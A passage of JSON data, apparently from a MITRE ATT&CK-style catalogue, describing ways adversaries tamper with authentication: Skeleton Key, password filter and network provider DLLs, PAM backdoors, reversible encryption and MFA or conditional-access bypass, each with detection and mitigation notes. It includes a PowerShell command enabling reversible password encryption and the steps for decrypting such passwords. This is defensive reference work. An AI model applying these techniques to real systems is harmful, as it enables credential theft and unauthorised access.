Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","Process: Process Access","Logon Session: Logon Session Creation","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","Process: OS API Execution","Windows Registry: Windows Registry Key Creation","File: File Creation","User Account: User Account Modification","File: File Modification","Module: Module Load","Cloud Service: Cloud Service Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to the <code>/Library/Security/SecurityAgentPlugins</code> directory."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>\n\nLimit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities.\n\nLimit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>. \n\nStarting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended.\n\nPeriodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nPeriodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}],"subTechniques":[{"id":"T1556.001","name":"Domain Controller Authentication","description":"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments. <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>","detection":"Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Creation","Process: Process Access","File: File Modification","Process: OS API Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to recognize and handle suspicious email attachments. Emphasize the importance of caution when opening attachments from unknown or unexpected sources, even if they appear legitimate. Implement email warning banners to alert users about emails originating from outside the organization or containing attachments, reinforcing awareness and helping users identify potential spearphishing attempts."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1556.002","name":"Password Filter DLL","description":"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. <a href=\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carnal Ownage Password Filters Sept 2013)</a>","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (C:\\Windows\\System32\\ by default) of a domain controller and/or local computer with a corresponding entry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages."}]},{"id":"T1556.003","name":"Pluggable Authentication Modules","description":"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>. <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a> <a href=\"https://linux.die.net/man/8/pam_unix\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Man Pam_Unix)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Hat PAM)</a>\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials. <a href=\"https://github.com/zephrax/linux-pam-backdoor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Backdoor)</a>\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords. <a href=\"https://x-c3ll.github.io/posts/PAM-backdoor-DNS/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Creds)</a> <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a>","detection":"Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Linux","macOS"],"dataSources":["File: File Modification","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from modifying PAM components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information."}]},{"id":"T1556.004","name":"Network Device Authentication","description":"Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials. <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a>","detection":"Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>\n\nDetection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"}]},{"id":"T1556.005","name":"Reversible Encryption","description":"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value. <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_1)</a> <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_2)</a>\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a> In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.","detection":"Monitor property changes in Group Policy: <code>Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. Group Policy Modification). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. \n\nMonitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Command: Command Execution","User Account: User Account Metadata","Script: Script Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"}]},{"id":"T1556.006","name":"Multi-Factor Authentication","description":"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality. <a href=\"https://www.mandiant.com/media/17826\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT42)</a> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/governance/conditional-access-exclusion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Conditional Access Exclusions)</a>\n\nFor example, modifying the Windows hosts file (<code>C:\\windows\\system32\\drivers\\etc\\hosts</code>) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a> \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a>","detection":"","platforms":["IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the secure enrollment and deactivation of MFA for user accounts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Ensure that MFA and MFA policies and requirements are properly implemented for existing and deactivated or dormant accounts and devices. If possible, consider configuring MFA solutions to \"fail closed\" rather than grant access in case of serious errors."},{"id":"M1047","name":"Audit","description":"Review MFA actions alongside authentication logs to ensure that MFA-based logins are functioning as intended. Review user accounts to ensure that all accounts have MFA enabled. <a href=\"https://www.mandiant.com/resources/blog/cloud-bad-log-configurations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Cloudy Logs 2023)</a>"}]},{"id":"T1556.007","name":"Hybrid Identity","description":"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Hybrid Identity)</a>:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the <code>AzureADConnectAuthenticationAgentService</code> process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. <a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Connect for Read Teamers)</a> <a href=\"https://o365blog.com/post/on-prem_admin/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals Azure AD On-Prem to Cloud)</a> In environments using AD FS, an adversary may edit the <code>Microsoft.IdentityServer.Servicehost</code> configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a>","detection":"","platforms":["IaaS","Identity Provider","Office Suite","SaaS","Windows"],"dataSources":["File: File Modification","Module: Module Load","Application Log: Application Log Content","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Entra ID Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Periodically review the hybrid identity solution in use for any discrepancies. For example, review all PTA agents in the Entra ID Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"}]},{"id":"T1556.008","name":"Network Provider DLL","description":"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. <a href=\"https://learn.microsoft.com/en-us/windows/win32/secauthn/network-provider-api\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Network Provider API)</a> During the logon process, Winlogon (the interactive logon module) sends credentials to the local <code>mpnotify.exe</code> process via RPC. The <code>mpnotify.exe</code> process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a> <a href=\"https://www.youtube.com/watch?v=ggY3srD9dYs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY Video)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a> \n\nAdversaries can configure a malicious network provider DLL to receive credentials from <code>mpnotify.exe</code>. <a href=\"https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY)</a> Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the <code>NPLogonNotify()</code> function. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a>\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a>","detection":"","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification","Process: OS API Execution","File: File Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1028","name":"Operating System Configuration","description":"Starting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1047","name":"Audit","description":"Periodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>).\n\nEnsure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}]},{"id":"T1556.009","name":"Conditional Access Policies","description":"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Conditional Access)</a> <a href=\"https://jumpcloud.com/support/get-started-conditional-access-policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JumpCloud Conditional Access Policies)</a> <a href=\"https://support.okta.com/help/s/article/Conditional-access-based-on-device-security-posture?language=en_US\" 